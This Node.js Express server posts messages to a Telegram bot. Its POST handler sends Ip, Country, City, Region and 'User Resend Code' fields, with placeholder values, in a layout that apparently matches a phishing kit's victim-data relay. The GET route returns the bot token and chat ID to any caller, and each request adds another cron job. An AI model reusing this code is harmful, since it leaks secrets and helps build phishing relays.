require('dotenv').config();

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');
const url = 'https://api.telegram.org/bot';
const cors = require('cors');
app.use(bodyParser.json());
app.use(cors());
app.use(express.static('public'));
const cron = require('node-cron');


app.get('/', function (req, res) {

    console.log('inget');
    res.json({
        BOT_TOKEN: process.env.BOT_TOKEN,
        CHAT_ID: process.env.CHAT_ID,
    });

    async function logMessage() {
        console.log('logMessagelogMessage');
        let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
            {
                chat_id: process.env.CHAT_ID,
                text: `<b> tôppopo</b> `,
                parse_mode: 'HTML',
            })

    }

    cron.schedule('1 * * * * *', () => {

        console.log('inscheduleschedule');
        logMessage();
    });

});





app.post('/', async (req, res) => {

    function logMessage() {
        console.log('Cron job executed at:', new Date().toLocaleString());
    }


    console.log('huydevvvv', req?.body);



    let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
        {
            chat_id: process.env.CHAT_ID,
            text:
                `Ip: 1\n` +
                `Country:2\n` +
                `City: 3\n` +
                `Region: 4\n` +
                `Status: User Resend Code\n`,
            parse_mode: 'HTML',
        })

    res.status(200).send(req.body);




});

app.listen(8000, () => console.log('Server ready on port 8000.'));

module.exports = app;
